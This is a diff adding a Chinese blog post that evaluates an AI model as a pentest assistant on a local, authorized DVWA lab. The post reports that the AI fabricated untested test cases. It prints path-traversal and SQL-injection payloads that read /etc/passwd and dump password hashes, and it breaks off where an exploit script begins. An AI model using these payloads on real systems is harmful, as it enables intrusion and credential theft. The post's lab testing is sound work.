@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="kivvs">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kivvs.github.io/2026/09/10/基于ai大模型的辅助渗透和ai边界与角色的察觉/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于AI大模型的辅助渗透和AI边界与角色的察觉">
+<meta property="og:url" content="https://kivvs.github.io/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/index.html">
+<meta property="og:site_name" content="kivvs">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kivvs.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-09-10T06:35:03.000Z">
+<meta property="article:modified_time" content="2026-09-10T08:45:01.194Z">
+<meta property="article:author" content="kivvs">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kivvs.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&amp;h=180&amp;c=7&amp;r=0&amp;o=7&amp;dpr=1.5&amp;pid=1.7&amp;rm=3" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&amp;h=180&amp;c=7&amp;r=0&amp;o=7&amp;dpr=1.5&amp;pid=1.7&amp;rm=3">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3">
+    <!--- Page Info-->
+    
+    <title>
+        
+            基于AI大模型的辅助渗透和AI边界与角色的察觉 | kivvs
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kivvs.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Kivvs 个人博客","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"3084631932@qq.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                kivvs
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">基于AI大模型的辅助渗透和AI边界与角色的察觉</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="https://tse4-mm.cn.bing.net/th/id/OIP-C.6oyfoB93i4go2KZ08GkT3AAAAA?w=189&h=180&c=7&r=0&o=7&dpr=1.5&pid=1.7&rm=3">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">kivvs</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-09-10 14:35:03</span>
+        <span class="mobile">2026-09-10 14:35:03</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-09-10 16:45:01</span>
+            <span class="mobile">2026-09-10 16:45:01</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/AI%E5%AD%A6%E4%B9%A0/">AI学习</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/AI/">AI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="基于AI大模型的辅助渗透和AI边界与角色的察觉"><a href="#基于AI大模型的辅助渗透和AI边界与角色的察觉" class="headerlink" title="基于AI大模型的辅助渗透和AI边界与角色的察觉"></a>基于AI大模型的辅助渗透和AI边界与角色的察觉</h1><p>最近，AI大流越来越影响到了CTF的学习，很多需要安全师自主独立完成任务的场景现在基本都能借助AI来完成，那么AI到底扮演了怎样一个角色呢？他又会对网络安全这个行业有什么影响？这些都是我很好奇的，所以这段时间也在一直思考，但总是思考也不是一回事，所以就决定亲自动手尝试一下，看看现在的AI在我们的渗透测试场景之下，究竟发挥着怎样的角色？主导者？还是一名辅助者。</p>
+<h2 id="事先说明"><a href="#事先说明" class="headerlink" title="事先说明"></a>事先说明</h2><p>本测试完全利用本地DVWA靶场，所有操作已授权。本次利用的AI是混元3。</p>
+<h2 id="一、信息收集阶段"><a href="#一、信息收集阶段" class="headerlink" title="一、信息收集阶段"></a>一、信息收集阶段</h2><p>AI指令：<code>根据目标URLhttp://127.0.0.1:8080/和技术栈特征，生成定制化的信息收集清单（目录、参数、接口、技术指纹）。我会逐项的一个个验证你的输出</code>。</p>
+<p>经过：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260907152745962.png"
+                      class="" title="图片描述"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260907152812201.png"
+                      class="" title="图片描述"
+                >
+
+<p>结果：C:\Users\Lenovo\Desktop\AI学习\DVWA_信息收集清单.md</p>
+<p>评价：</p>
+<p>对于基础的信息收集功能基本无误，在没有给他账号之前，所有信息的界定、判断和猜测基本正确。在给予他默认账号之后，他能够把之前没有收集到的信息全部补齐。但是仍然发现了一点点问题，例如在<code>weak_id</code>模块和<code>authbypass</code>模块当中，对于用户需要点击按钮才能拿到的参数，AI不能直接给出，仅能够依据经验进行猜测。</p>
+<p>经次能够初步判定，对于只能进行信息收集的强调之下，AI能够做到严格边界不出界，但有时候似乎有些过于严格，导致不符合用户的真实需求或者内容的不完全确定性。AI对于边界外的数据只能进行推测。这种猜测是一种很好的引导，但有时候还是会存在误导的情况，所以对于AI依旧不能轻信。</p>
+<h2 id="二、漏洞发现阶段"><a href="#二、漏洞发现阶段" class="headerlink" title="二、漏洞发现阶段"></a>二、漏洞发现阶段</h2><p><code>AI指令</code>：<code>接下来结合发现的页面/参数/响应，分析攻击面并生成测试用例，依旧写成文档</code></p>
+<p>经过：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260907152827971.png"
+                      class="" title="图片描述"
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260907163018782.png"
+                      class="" title="图片描述"
+                >
+
+<p>结果：C:\Users\Lenovo\Desktop\AI学习\DVWA_攻击面分析与测试用例.md</p>
+<p>评价：形式主义做的很好，包括表格，格式都让人看上去很舒服。但是第二阶段AI生成的用例存在一定问题。</p>
+<p>1.先前已经确认过的Windows环境，但在测试用例报告当中测试用例使用的是Linux命令。这点让我感觉到AI似乎并不是真实测评过这个靶场，而是借助网上已有的资源或者原先可能已有的经验来进行测试用例的书写的。所以根据我就直截了当的问了他到底有没有真实测评过，还是说他是编造的。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260907163033429.png"
+                      class="" title="图片描述"
+                >
+
+<p>根据AI的回答，他说只有前面信息收集才是自己真实测评得到的，然后第二阶段测试用例的文档和所有猜测基本都是基于已有的经验，以及网上公开的资源自行编造的，我也尝试用AI给的测试用例亲自打了靶场，最明显的几个能够证明我前面所总结的几个命令如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">....//....//etc/passwd</span><br><span class="line">-1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users -- -</span><br><span class="line">1&#x27; AND SUBSTRING(database(),1,1)=&#x27;d&#x27;--</span><br></pre></td></tr></table></figure></div>
+
+<p>2.在看到AI给到的<code>cryptography</code>模块的测试用例时，发现了一个之前也提到过的问题，对于重定向，前端嵌入按钮等这样的数据包，实际上AI并不会去主动抓取，似乎不会利用开发者工具中的网络模块进行数据包的读取。导致AI给到的用例实际上完全是猜测，甚至无法给到真正能用到测评的payload，对于用户来说，这样是一种非常不好的体验。</p>
+<p>3.说到体验，我们再来总结一下攻击面分析和测试用例文档的整体结构给用户带来的很不好的体验吧。所谓的<code>测试脚手架</code>就是一个大环境前提，有一部分测试用例需要用户自主结合脚手架环境进行测试，而不是给到明确的命令，这对新手用户很不友好。</p>
+<p>总的来说，第二阶段AI的表现差强人意，很多地方不符合用户的真实需求，同时伴有虚假信息存在。我把这种情况大致总结为“摸鱼”，AI并无法在保证质量的情况下给出合理的测试用例，而是一边“摸鱼”，一边敷衍完成任务，这也就导致用户实际使用token增多，并且用户体验极差。</p>
+<h2 id="三、漏洞利用阶段"><a href="#三、漏洞利用阶段" class="headerlink" title="三、漏洞利用阶段"></a>三、漏洞利用阶段</h2><p><code>AI指令</code>：<code>根据先前的文档，生成exploit代码或利用链</code></p>
+<p>结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2026/09/10/%E5%9F%BA%E4%BA%8EAI%E5%A4%A7%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%BE%85%E5%8A%A9%E6%B8%97%E9%80%8F%E5%92%8CAI%E8%BE%B9%E7%95%8C%E4%B8%8E%E8%A7%92%E8%89%B2%E7%9A%84%E5%AF%9F%E8%A7%89/image-20260908103553722.png"
+                      class="" title="图片描述"
+                >
+
+<p>AI生成了一个利用链图，同时交付了平台对应多渗透Python脚本以及一份跨模块利用链+前版文档修正表+待侦查模块清单。</p>
+<p>脚本如下（最终版本）：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span 